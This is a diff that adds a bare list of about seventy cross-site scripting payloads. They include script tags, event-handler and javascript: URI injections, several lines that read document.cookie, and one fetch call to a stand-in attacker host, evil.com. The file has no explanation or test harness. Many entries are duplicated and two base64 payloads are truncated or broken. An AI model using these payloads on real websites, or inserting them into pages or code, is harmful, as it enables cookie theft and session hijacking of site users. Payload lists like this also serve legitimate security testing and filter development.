@@ -1,0 +1,71 @@
+<script>alert(1)</script>
+<svg/onload=alert(1)>
+<img src=x onerror=alert(1)>
+<iframe src="javascript:alert(1)">
+"><script>alert(1)</script>
+<IMG SRC="javascript:alert('XSS')">
+</script><script>alert('XSS')</script>
+<INPUT type="image" src="javascript:alert('XSS')">
+<svg xmlns="http://www.w3.org/2000/svg"><text y="50%" x="50%" fill="red" text-anchor="middle" onload="alert(1)">XSS</text></svg>
+<script>alert(String.fromCharCode(88,83,83))</script>
+<IMG SRC="javascript:alert(document.cookie)">
+<iframe src="javascript:alert(document.cookie)"></iframe>
+<svg><desc/onload=alert('XSS')>XSS</desc></svg>
+<IMG src="x" onerror="alert(1)">
+<video><source src="javascript:alert(1)" type="video/mp4"></video>
+<iframe src="javascript:alert(1);"></iframe>
+<marquee onstart=alert(1)>XSS</marquee>
+<svg/onload=confirm('XSS')>
+<OBJECT data="javascript:alert(1)"></OBJECT>
+<embed src="javascript:alert(1)">
+<script>fetch('http://evil.com/xss')</script>
+<details open ontoggle="alert('XSS')">
+<math><mrow onmouseover="alert(1)">XSS</mrow></math>
+<svg><animate onbegin="alert(1)">XSS</animate></svg>
+<form action="javascript:alert(1)">
+<input type="button" value="XSS" onclick="alert(1)">
+<a href="javascript:alert(1)">XSS Link</a>
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">
+<img src="x" onerror="alert(1)">
+<button onclick="alert(1)">XSS Button</button>
+<iframe srcdoc="<script>alert('XSS')</script>"></iframe>
+<object data="data:text/html,<script>alert('XSS')</script>"></object>
+<iframe src="javascript:alert(1);"></iframe>
+<img src="x" onerror="alert(1)" />
+<script>alert('XSS')</script>
+<iframe src="javascript:alert('XSS');"></iframe>
+<a href="javascript:alert('XSS')">Click Me</a>
+<svg><g onload="alert(1)"></g></svg>
+<script>document.write('<img src="x" onerror="alert(1)">')</script>
+<embed type="image/svg+xml" src="data:image/svg+xml,<svg onload=alert(1)>"></embed>
+<input type="text" value="<script>alert(1)</script>">
+<button onclick="alert('XSS')">Click Me</button>
+<video><source src="javascript:alert(1)" type="video/mp4"></video>
+<img src="data:image/svg+xml;base64,PHN2ZyBvbm..."> 
+<form action="javascript:alert(1)">
+<a href="javascript:void(0)" onclick="alert(1)">Click</a>
+<details open ontoggle="alert('XSS')">
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">
+<video onplay="alert('XSS')">
+<marquee behavior="alternate" onstart="alert(1)">XSS</marquee>
+<svg><desc onload="alert(1)">XSS</desc></svg>
+<a href="javascript:confirm(1)">XSS Confirm</a>
+<svg xmlns="http://www.w3.org/2000/svg"><text x="50%" y="50%" onload="alert(1)">XSS</text></svg>
+<svg><animate onend="alert(1)">XSS</animate></svg>
+<svg><circle onmouseover="alert(1)">XSS</circle></svg>
+<iframe src="data:text/html,<script>alert('XSS')</script>"></iframe>
+<form action="javascript:alert(1)">
+<input type="text" name="xss" value="XSS">
+<embed src="data:text/html,<script>alert('XSS')</script>"></embed>
+<a href="javascript:alert(1)">Click Me</a>
+<object data="javascript:alert(1)"></object>
+<svg><circle onmouseover="alert(1)">XSS</circle></svg>
+<embed src="data:image/svg+xml,<svg onload=alert(1)>"></embed>
+<details><summary>Click me</summary><p onmouseover="alert(1)">XSS</p></details>
+<input type="button" value="Submit" onclick="alert('XSS')">
+<iframe srcdoc="<script>alert('XSS')</script>"></iframe>
+<img src="data:image/svg+xml;base64,PHN2ZyBvbmloadWZl"> 
+<video onplay="alert('XSS')">
+<svg><text y="50%" x="50%" fill="red" text-anchor="middle" onload="alert(1)">XSS</text></svg>
+<form action="javascript:void(0)" onsubmit="alert(1)">
+<img src="x" onerror="alert(1)">
